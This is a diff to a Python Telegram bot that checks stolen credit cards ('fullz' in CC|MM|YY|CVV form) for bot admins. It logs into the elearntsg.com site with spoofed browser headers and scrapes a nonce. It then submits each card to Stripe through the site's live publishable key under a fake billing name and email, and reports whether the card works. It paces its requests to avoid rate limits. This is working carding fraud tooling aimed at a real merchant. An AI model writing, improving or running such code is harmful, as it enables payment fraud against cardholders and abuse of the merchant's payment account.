@@ -43,17 +43,19 @@ def gets(s: str, start: str, end: str) -> str | None:
     except ValueError:
         return None
 
-# CREATE PAYMENT METHOD WITH EXPIRY VALIDATION AND STRIPE REQUEST
+# CREATE PAYMENT METHOD WITH EXPIRY VALIDATION (revised to continue even if expiry invalid)
 async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple[str, str, str, str]:
     try:
         cc, mes, ano, cvv = fullz.split("|")
 
-        # VALIDATE EXPIRATION DATE (do not return on error yet)
+        # VALIDATE EXPIRATION DATE but continue processing
         mes = mes.zfill(2)
         if len(ano) == 4:
             ano = ano[-2:]
+
         current_year = int(time.strftime("%y"))
         current_month = int(time.strftime("%m"))
+
         expiry_valid = True
         try:
             expiry_month = int(mes)
@@ -89,14 +91,24 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
         if login is None:
             return "Login token not found", '', '', ''
 
-        headers.update({
+        headers = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Connection': 'keep-alive',
             'Content-Type': 'application/x-www-form-urlencoded',
             'Origin': 'https://elearntsg.com',
             'Referer': 'https://elearntsg.com/login/',
+            'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
             'Sec-Fetch-Site': 'same-origin',
             'Sec-Fetch-User': '?1',
-        })
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
+        }
 
         data = {
             'learndash-login-form': login,
@@ -107,24 +119,68 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
             'redirect_to': '',
         }
 
-        await session.post('https://elearntsg.com/wp-login.php', headers=headers, data=data)
+        response = await session.post('https://elearntsg.com/wp-login.php', headers=headers, data=data)
 
-        # Navigate other pages as in original code
-        pages = [
-            'https://elearntsg.com/activity-feed/',
-            'https://elearntsg.com/my-account/payment-methods/',
-            'https://elearntsg.com/my-account/add-payment-method/',
-        ]
-        for page in pages:
-            await session.get(page, headers=headers)
+        headers = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Connection': 'keep-alive',
+            'Referer': 'https://elearntsg.com/login/',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
+        }
 
-        # Get nonce token required for Stripe submission
+        response = await session.get('https://elearntsg.com/activity-feed/', headers=headers)
+
+        headers = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive',
+            'Referer': 'https://elearntsg.com/activity-feed/',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
+        }
+
+        response = await session.get('https://elearntsg.com/my-account/payment-methods/', headers=headers)
+
+        headers = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive',
+            'Referer': 'https://elearntsg.com/my-account/payment-methods/',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
+        }
+
+        response = await session.get('https://elearntsg.com/my-account/add-payment-method/', headers=headers)
+
         nonce = gets(response.text, '"add_card_nonce":"', '"')
         if nonce is None:
             return "Nonce token not found", '', '', ''
 
-        # Prepare stripe headers and data
-        stripe_headers = {
+        headers = {
             'accept': 'application/json',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
@@ -140,7 +196,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        stripe_data = {
+        data = {
             'type':'card',
             'billing_details[name]':'oliver jackson',
             'billing_details[email]':'oliverjackson1209@gmail.com',
@@ -161,7 +217,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
             'key':'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
         }
 
-        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
+        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
         pm_json = response.json()
         try:
@@ -182,7 +238,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
         if error_message:
             return error_message, country, brand, card_type
 
-        post_headers = {
+        headers = {
             'Accept': 'application/json, text/javascript, */*; q=0.01',
             'Accept-Language': 'en-US,en;q=0.9',
             'Connection': 'keep-alive',
@@ -203,18 +259,17 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple
             'wc-ajax': 'wc_stripe_create_setup_intent',
         }
 
-        post_data = {
+        data = {
             'stripe_source_id': id,
             'nonce': nonce,
         }
 
-        response = await session.post('https://elearntsg.com/', params=params, headers=post_headers, data=post_data)
+        response = await session.post('https://elearntsg.com/', params=params, headers=headers, data=data)
 
         return response.text, country, brand, card_type
 
     except Exception as e:
         return f"EXCEPTION: {str(e)}", '', '', ''
-
 
 # FUNCTION MAPS API RESPONSE TEXT TO FRIENDLY MESSAGE
 async def charge_resp(result):
@@ -329,7 +384,6 @@ async def charge_resp(result):
     except Exception as e:
         return f"{str(e)} ❌"
 
-# COMBINES create_payment_method + charge_resp + MEASURE TIME
 async def multi_checking(fullz: str) -> str:
     start = time.time()
     async with httpx.AsyncClient(timeout=40) as session:
@@ -372,8 +426,6 @@ async def multi_checking(fullz: str) -> str:
 
     return output
 
-# TELEGRAM BOT HANDLERS
-
 TELEGRAM_BOT_TOKEN = os.getenv("TOKEN")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -401,7 +453,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         "SEND CARD IN FORMAT » CC|MM|YY|CVV\n"
     )
 
-
 async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id = update.effective_chat.id
     global admin_chat_ids
@@ -427,7 +478,6 @@ async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     admin_chat_ids.add(new_admin_id)
     save_admin_chat_ids(admin_chat_ids)
     await update.message.reply_text(f"USER ID {new_admin_id} HAS BEEN SUCCESSFULLY ADDED AS ADMIN!")
-
 
 async def deladmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id = update.effective_chat.id
@@ -459,7 +509,6 @@ async def deladmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     save_admin_chat_ids(admin_chat_ids)
     await update.message.reply_text(f"USER ID {remove_admin_id} HAS BEEN REMOVED FROM ADMINS.")
 
-
 async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if update.effective_chat.id not in admin_chat_ids:
         await update.message.reply_text("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
@@ -467,7 +516,6 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
     text = update.message.text.strip()
 
-    # SPLIT INPUT CARD DATA BY LINES AND SPACES
     raw_cards = []
     for line in text.splitlines():
         for part in line.strip().split():
@@ -496,7 +544,6 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
             cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"
 
-            # DELAY FOR RATE LIMITING
             await asyncio.sleep(3)
 
             result = await multi_checking(cc_formatted)
